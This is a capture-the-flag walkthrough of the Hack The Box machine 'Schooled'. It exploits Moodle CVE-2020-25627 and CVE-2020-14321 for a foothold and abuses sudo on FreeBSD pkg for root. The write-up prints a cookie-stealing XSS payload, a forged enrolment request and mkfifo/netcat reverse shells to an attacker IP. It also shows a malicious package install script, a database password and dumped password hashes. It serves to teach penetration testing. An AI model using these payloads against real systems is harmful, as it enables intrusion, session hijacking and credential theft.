---
layout: single
title: 'Walktrough: HTB Schooled'
namespace: htb-schooled
category: Walkthrough
tags:
- HTB Linux
- HTB Medium
- HackTheBox
header:
  teaser: https://i.imgur.com/ksBoJIQ.png
  og_image: https://i.imgur.com/ksBoJIQ.png
---
Hello guys!

This week's machine will be **Schooled**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [TheCyberGeek](https://app.hackthebox.eu/users/114053).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Schooled](https://i.imgur.com/qw8zycI.png){: .align-center}

To solve this box, I was required to exploit two CVEs for a vulnerable Moodle Version, which was the hardest part once the PoC available didn't work and spent some time understanding the required steps and then getting the initial foothold. After that, all went fine, obtaining creds from Moodle database and then abusing over-permissive `sudo` configurations.

I hope you guys enjoy it!

## Enumeration

As usual, started by running a `nmap` quick scan to see which services are currently published

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.234
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 14:41 -03
Nmap scan report for 10.10.10.234
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey:
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
```

In parallel, after the initial scan, was also able to enumerate the port 33060/TCP, resulting in the following output:

```bash
$ nmap -p 80,33060 -A -oA Full 10.10.10.234                                                                                     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 14:57 -03
Nmap scan report for schooled.htb (10.10.10.234)
Host is up (0.077s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=8/1%Time=6106E084%P=x86_64-pc-linux-gnu%r(NU
SF:LL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVersi
SF:onBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2B
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x
SF:08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20mes
SF:sage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAND
SF:esk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC
SF:,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0
SF:fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid\
SF:x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\
SF:x88'\x1a\x0fInvalid\x20message\"\x05HY000");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds
```

### 80/TCP - HTTP Service

Accessing this initial page, we can see an institutional page of a School, which also mentions that all content is delivered using **Moodle**, that we might need to find it to dig a little further on it.

![HTB Schooled - Institutional Page](https://i.imgur.com/hy0QFcA.png){: .align-center}

Also, by running `whatweb` I have found an e-mail address **admissions@schooled.htb** where `schooled.htb` might be the domain name for this machine, which was later added to the hosts file.

```bash
$ whatweb --color=never -a 3 10.10.10.234
http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap[4.1.0], Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]
```

While left `gobuster` running in the background to check other pages in the site, started another instance **enumerating subdomains** and have found both **moodle** and **student**, also later added to the local hosts file.

```bash
$ gobuster dns -d schooled.htb -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     schooled.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/dnsrecon/subdomains-top1mil-5000.txt
===============================================================
2021/08/01 17:24:31 Starting gobuster in DNS enumeration mode
===============================================================
Found: moodle.schooled.htb
Found: student.schooled.htb

===============================================================
2021/08/01 17:25:04 Finished
===============================================================
```

The subdomain `student.schooled.htb` was redirecting to the main page while `moodle.schooled.htb` was redirecting to the page below, a Moodle site that could allow us to gather some additional information, allowing us to have an initial foothold or even an RCE based on existing vulnerabilities.

![HTB Schooled - Moodle](https://i.imgur.com/Sx32BwP.png){: .align-center}

Starting with Moodle site enumeration, ran [moodlescan](https://github.com/inc0d3/moodlescan), a script that helps us to enumerate Moodle version, which returned **3.9.0-beta** as output below.

```bash
$ python3 moodlescan.py -u http://moodle.schooled.htb/moodle

Version 0.8 - May/2021
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle ...

server          : Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by    : PHP/7.4.15
x-frame-options : sameorigin
last-modified   : Mon, 02 Aug 2021 11:54:53 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```

Considering this version, did a quick search on the version. Found out that several vulnerabilities were present but would require some permissions that I still don't have. So decided to proceed on creating an account to poke a little inside the platform, considering that nothing was available for guests.

While creating the account, noticed a requirement for an e-mail account from **student.schooled.htb** subdomain, previously enumerated using `gobuster dns`.

Besides the e-mail domain requirement, e-mail validation wasn't required and with access to the platform started to browse the contents, to which I was only able to self-enroll to Mathematics class, where was found the following announcement:

> Reminder for joining students
> by Manuel Phillips - Wednesday, 23 December 2020, 12:01 AM
> Number of replies: 0
> This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.
>
> Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.
>
> Look forward to seeing you all soon.
>
> Manuel Phillips

This means that teacher Manuel Philips will check all MoodleNet profiles for all enrolled students and, in case we can store an XSS on it, we might be able to steal the teacher's session and enumerate further the platform while searching for an RCE opportunity.

## Initial access

Searching for **MoodleNet XSS**, I came across a [Security Announcement](https://moodle.org/mod/forum/discuss.php?d=410839) from Moodle mentioning the **CVE-2020-25627**, which was fixed in version 3.9.2 and affected versions 3.9 and 3.9.1, that matches our scenario.

Searching for a PoC for the related CVE, found the repo [HoangKien1020/CVE-2020-25627: Stored XSS via moodlenetprofile parameter in user profile (github.com)](https://github.com/HoangKien1020/CVE-2020-25627) containing the instructions to exploit it, which was implemented and permitted us to obtain teacher's session cookie as evidence below:

* Logged as the recently created user and modified the MoodleNet profile with the following content

```html
<script>var i=new Image;i.src="http://10.10.10.10/xss.php?"+document.cookie;</script>
```

* Hosted the `xss.php` in a folder and started a local PHP webserver, which 2 minutes later displayed us the teacher's cookie on the page

```bash
$ sudo php -S 0.0.0.0:80 -t .
[Mon Aug  9 14:44:05 2021] PHP 7.4.21 Development Server (http://0.0.0.0:80) started
[Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Accepted
[Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: METHOD in /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 28
[Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: REMOTE_HOST in /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 29
[Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 [200]: GET /xss.php?MoodleSession=d8so1t4rs4vmg8btrgfr2ps6fr
[Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Closing

```

Now aware of this Session parameter, changed it in browser and we can now see in the upper right corner that I'm connected as Manuel Philips

![HTB Schooled - Moodle as Manuel Philips](https://i.imgur.com/n3plh19.png){: .align-center}

Now that I have a more privileged access as a teacher, we need to check if current permissions (Teacher) are enough to get an RCE.

Searching about Moodle Exploitation on [Moodle - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/moodle#rce) page, found out that I need to be a manager to upload a plugin, which can host malicious code to our purpose. Besides not having the appropriate permission noticed that version **is also vulnerable to a** [**Privilege Escalation Vulnerability**](https://moodle.org/mod/forum/discuss.php?d=407393), which could allow me to get manager permission in the course abusing the enrollment process and, if a student is the Site Manager, I could impersonate him and upload the malicious plugin, obtaining RCE. The same author of the other CVE has also [a repository in Github](https://github.com/HoangKien1020/CVE-2020-14321) containing a PoC that could help us to escalate those privileges and get RCE.

Besides not working well in our scenario, understanding the steps required used in the exploit, the following steps were executed to be able to get RCE:

* The first thing would identify who in the platform could have manager permissions. Based on the institutional page, **Lianne Carter** is the school's manager and possibly has the rights we need.
* Also took note of **Manuel Philips**' Profile id, which was obtained from his profile page at `http://moodle.schooled.htb/moodle/user/profile.php?id=24`.
* Things started by enrolling the school's manager in the class and, intercepting the request and sending a copy of it to Burp's Repeater, also crafted a request granting us Manager Administration in the course, by assigning us the `roleid=1` in the request, as well as changing the assignee id to Manuel Philips, the same way as seen in the PoC video.

```http
GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=KbJYqTapFc&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=24&roletoassign=1&startdate=4&duration= HTTP/1.1
Host: moodle.schooled.htb
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/json
Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: MoodleSession=jil2s8i0vj0gq3vojfki6e7rtq
Connection: close
```

* Now as a course administrator, accessing a user's profile, we can see the "Log in as" link, which permitted us to impersonate Lianne Carter.

  ![HTB Schooled - Impersonating Manager in Moodle](https://i.imgur.com/zRjimbq.png){: .align-center}
* Now as Lianne, we were supposed to be able to upload the plugin directly but, as this option isn't enabled in their tenant, we needed to first edit the Role permissions to allow this. Navigated to Site Administration pane > Users and then, under Permissions, selected Define roles.

  ![HTB Schooled - Adjusting Role Definitions](https://i.imgur.com/6XmydvH.png)
* Selected the **Manager** role and, after clicking in the "Edit" Button, intercepted the request, and appended the payload for full permissions, as shared also in the previously used script repo.

  ![HTB Schooled - Modifying Manager role](https://i.imgur.com/lm0NOX7.png){: .align-center}

  ![HTB Schooled - Appending payload to Edit Request](https://i.imgur.com/5L28UqN.png){: .align-center}
* Now, navigating to Site Administration > Plugins we can see the Install Plugins option, where the rce.zip also available in the portal was available, which was uploaded with success, and allowed us to obtain RCE by calling the URL below, later changed to get a reverse shell

```bash
$ curl -X GET -G 'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php' --data-urlencode 'cmd=id'
uid=80(www) gid=80(www) groups=80(www)

$ curl -X GET -G 'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php' --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f'
```

## User Flag

Now with `www-data` account, started enumerating box. As usual decided to automate the task using `linpeas.sh` but found out that `wget` and `curl` were not available, so I wrote a simple `php` script that downloads a file from a webserver and then ran the script

```bash
echo "<?php" > wget.php
echo "\$url = 'http://10.10.10.10/linpeas.sh';" >> wget.php
echo "\$file = '/tmp/linpeas.sh';" >> wget.php
echo "\$current = file_get_contents(\$url);" >> wget.php
echo "file_put_contents(\$file, \$current);" >> wget.php
echo "?>" >> wget.php

/usr/local/bin/php wget.php
```

From the execution, the following information was obtained:

* Users with console and their permissions:

```plaintext
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
root:*:0:0:Charlie &:/root:/bin/csh
steve:*:1002:1002:User &:/home/steve:/bin/csh
```

* Moodle Database password in file \`/usr/local/www/apache24/data/moodle/config.php\` :

```plaintext
$CFG->dbtype    = 'mysqli';
$CFG->dbhost    = 'localhost';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
'dbport' => 3306,
```

Later I have found that we were only missing some paths in PATH finding `curl` installed. This was also needed to find `mysql` binary to dump the database credentials, as command line below, which was required once I wasn't in an interactive tty

```bash
$ find / -type f 2>/dev/null | grep -e "wget$" -e "curl$" -e "mysql$"
/usr/local/bin/curl
/usr/local/bin/mysql
/usr/local/share/bash-completion/completions/wget
/usr/local/share/bash-completion/completions/curl
/usr/local/share/bash-completion/completions/mysql
/usr/local/share/zsh/site-functions/_curl
/var/mail/mysql
```

Dumping the creds was possible with the command below:

```bash
$ /usr/local/bin/mysql -u moodle --password=PlaybookMaster2020 -e "use moodle; select email,username,password from mdl_user; exit" | grep -v 'student.'
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'exit' at line 1
email   username        password
root@localhost  guest   $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
jamie@staff.schooled.htb        admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
higgins_jane@staff.schooled.htb higgins_jane    $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
phillips_manuel@staff.schooled.htb      phillips_manuel $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
carter_lianne@staff.schooled.htb        carter_lianne   $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
```

Based on the hashes, created a file in the format username:hash and then ran `john`, where was obtained the password for account `jamie` as below

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt accounts.txt                                                                 Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (jamie)
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

With these creds, connected through SSH and obtained the `user.txt` flag :smile:

```bash
jamie@Schooled:~ $ id && hostname && cat user.txt
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
Schooled
<redacted>
```

## Root Flag

Starting the enumeration for the root flag, the first command executed was `sudo -l` as usual, which displayed the commands below

```bash
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

Checking the [GTFOBins page](https://gtfobins.github.io/gtfobins/pkg/) for `pkg` found that we might be able to install a crafted package to run a command. The below steps were used to obtain a reverse shell as root

* Installed `fpm`, also available from this [Github Repository](https://github.com/jordansissel/fpm)

```bash
sudo apt-get install ruby ruby-dev rubygems build-essential
sudo gem install --no-document fpm
```

* Created a package containing the malicious payload from the attacker machine

```bash
TF=$(mktemp -d)
echo 'export file="/tmp/zurc"' > $TF/x.sh
echo 'rm $file;mkfifo $file;cat $file|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >$file' >> $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```

* Download package and install using `sudo` based on `jamie`'s permissions

```bash
jamie@Schooled:/tmp $ /usr/local/bin/curl http://10.10.10.10/x-1.0.txz -o x-1.0.txz
1.0.txz  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
100   572  100   572    0     0   4144      0 --:--:-- --:--:-- --:--:--  4144
jamie@Schooled:/tmp $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
rm: /tmp/zurc: No such file or directory
```

```bash
$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.234] 16349
# cd /root
# cat root.txt
<redacted>
```

I hope you guys have enjoyed it!

See you at the next post :smile:
